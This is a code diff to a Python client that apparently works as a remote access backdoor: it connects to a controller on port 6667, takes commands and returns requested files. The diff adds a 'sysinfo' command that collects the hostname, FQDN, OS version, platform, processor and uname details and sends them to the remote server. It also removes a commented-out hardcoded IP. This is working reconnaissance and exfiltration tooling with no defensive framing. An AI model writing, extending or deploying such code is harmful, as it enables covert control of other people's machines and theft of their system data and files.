@@ -9,6 +9,26 @@ from base64 import b64decode, b64encode
 from time import sleep
 import zipfile, zlib
 import shlex
+import platform
+
+
+def get_sys_info():
+    info = """
+Machine: {}\nVersion: {}
+Platform: {}\nNode: {}\nUname: {}\nSystem: {}
+Processor: {}\n\nHost Name: {}\nFQDN: {}\n
+""".format(
+        platform.machine(),
+        platform.version(),
+        platform.platform(),
+        platform.node(),
+        platform.uname(),
+        platform.system(),
+        platform.processor(),
+        socket.gethostname(),
+        socket.getfqdn()
+    )
+    return info
 
 
 def zipdir(path, ziph):
@@ -353,6 +373,11 @@ class Client(object):
                         sleep(1)
                         continue
 
+                    # Handle system information requests
+                    if data == 'sysinfo':
+                        self.send_data(get_sys_info())
+                        continue
+
                     # Handle a get command sent from server.
                     # Send the file data back.
                     if data[:4] == 'get ':
@@ -470,7 +495,6 @@ class Client(object):
 
 if __name__ == '__main__':
     the_host = ''
-    # the_host = '10.0.0.170'
     the_port = 6667
     the_recv_size = 1024
     the_server_shutdown = False
